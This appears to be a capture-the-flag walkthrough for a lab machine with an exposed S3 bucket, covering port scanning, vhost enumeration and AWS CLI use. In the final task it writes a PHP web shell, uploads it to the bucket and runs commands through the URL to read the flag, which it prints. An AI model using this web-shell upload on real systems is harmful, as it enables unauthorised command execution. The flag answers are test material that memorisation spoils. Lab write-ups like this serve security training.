@@ -1,0 +1,138 @@
+TASK 1
+How many TCP ports are open? 
+sol. 2
+┌──(root㉿kali)-[/home/kali]
+└─# nmap -F 10.129.163.15            
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-26 04:05 EDT
+Nmap scan report for 10.129.163.15
+Host is up (0.82s latency).
+Not shown: 98 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 4.71 seconds
+
+
+TASK 2
+What is the domain of the email address provided in the "Contact" section of the website? 
+sol. thetoppers.htb
+
+search http://10.129.163.15
+go to contacts and you can see the email
+
+TASK 3
+In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames? 
+sol. /etc/hosts
+┌──(root㉿kali)-[/home/kali]
+└─# cd /etc                                                                                                                                           
+┌──(root㉿kali)-[/etc]
+└─# nano hosts  
+10.129.163.15  thetoppers.htb
+save
+search http://thetoppers.htb
+
+TASK 4
+Which sub-domain is discovered during further enumeration? 
+sol. s3.thetoppers.htb
+┌──(root㉿kali)-[/etc]
+└─# gobuster vhost -u http://thetoppers.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
+
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:             http://thetoppers.htb
+[+] Method:          GET
+[+] Threads:         10
+[+] Wordlist:        /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+[+] User Agent:      gobuster/3.6
+[+] Timeout:         10s
+[+] Append Domain:   true
+===============================================================
+Starting gobuster in VHOST enumeration mode
+===============================================================
+Found: s3.thetoppers.htb Status: 404 [Size: 21]
+Found: gc._msdcs.thetoppers.htb Status: 400 [Size: 306]
+Progress: 4989 / 4990 (99.98%)
+===============================================================
+Finished
+===============================================================
+
+_____________________________________________________________________________________________________________________________________
+| Element                                	                 |      Explanation                                                       |
+|----------------------------------------------------------|------------------------------------------------------------------------|
+| gobuster	                                               |   Command-line tool for brute-forcing directories and vhosts.          |
+|----------------------------------------------------------|------------------------------------------------------------------------|
+| vhost	                                                   |   Mode for discovering virtual hosts.                                  |
+|----------------------------------------------------------|------------------------------------------------------------------------|
+| -u http://thetoppers.htb	                               |   Target URL for vhost discovery.                                      |
+|----------------------------------------------------------|------------------------------------------------------------------------|
+| -w /usr/share/wordlists/                                 |   Path to the wordlist for potential subdomains.                       |
+| seclists/Discovery/DNS/subdomains-top1million-5000.txt   |                                                                        |
+|----------------------------------------------------------|------------------------------------------------------------------------|
+| --append-domain	                                         |   Appends the main domain to each wordlist entry for subdomain checks. |
+-----------------------------------------------------------|-------------------------------------------------------------------------
+
+  
+TASK 5
+Which service is running on the discovered sub-domain? 
+sol. amazon s3
+
+TASK 6
+Which command line utility can be used to interact with the service running on the discovered sub-domain? 
+sol. awsci
+
+TASK 7
+Which command is used to set up the AWS CLI installation? 
+sol. aws configure
+
+TASK 8
+What is the command used by the above utility to list all of the S3 buckets? 
+sol. aws s3 ls
+┌──(root㉿kali)-[/etc]
+└─# aws s3 ls --endpoint-url=http://s3.thetoppers.htb s3://thetoppers.htb
+
+                           PRE images/
+2024-10-26 04:03:31          0 .htaccess
+2024-10-26 04:03:32      11952 index.php
+
+TASK 9
+This server is configured to run files written in what web scripting language? 
+sol. php
+
+TASK 10
+Submit root flag 
+sol. a980d99281a28d638ac68b9bf9453c2b 
+                                                                                                                   
+┌──(root㉿kali)-[/home/kali]
+└─# nano shell.php                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# cat shell.php
+<?php system($_GET['cmd']); ?>
+┌──(root㉿kali)-[/home/kali]
+└─# nano shell.php                                                                                                       
+┌──(root㉿kali)-[/home/kali]
+└─# cat shell.php
+<?php system($_GET['cmd']); ?>
+┌──(root㉿kali)-[/home/kali]
+└─# aws s3 cp --endpoint-url=http://s3.thetoppers.htb shell.php s3://thetoppers.htb
+upload: ./shell.php to s3://thetoppers.htb/shell.php             
+
+________________________________________________________________________________________________________________________________________________
+url:  http://thetoppers.htb/shell.php?cmd=ls
+
+images index.php shell
+________________________________________________________________________________________________________________________________________________
+________________________________________________________________________________________________________________________________________________
+url: http://thetoppers.htb/shell.php?cmd=ls+../
+
+flag.txt html 
+________________________________________________________________________________________________________________________________________________
+________________________________________________________________________________________________________________________________________________
+url: http://thetoppers.htb/shell.php?cmd=cat+../flag.txt
+
+a980d99281a28d638ac68b9bf9453c2b 
+________________________________________________________________________________________________________________________________________________
+
+
